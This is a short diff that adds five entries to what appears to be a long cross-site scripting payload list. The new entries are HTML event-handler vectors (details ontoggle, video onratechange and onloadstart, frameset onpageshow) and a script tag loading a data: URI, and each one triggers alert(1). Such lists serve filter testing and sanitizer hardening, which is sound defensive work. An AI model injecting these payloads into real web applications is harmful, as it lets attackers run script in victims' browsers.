@@ -1187,3 +1187,8 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <body/onpageshow=alert(1)>
 <div style=animation-name:x onanimationstart=alert(1)>
 <a href= /whatever>
+<details open ontoggle="alert(1)">
+<video src onratechange="alert(1)">
+<frameset onpageshow="alert(1)">  <body onpageshow="alert(1)"
+"><script/src=data:,alert(1)-">
+<video src onloadstart=alert(1)>
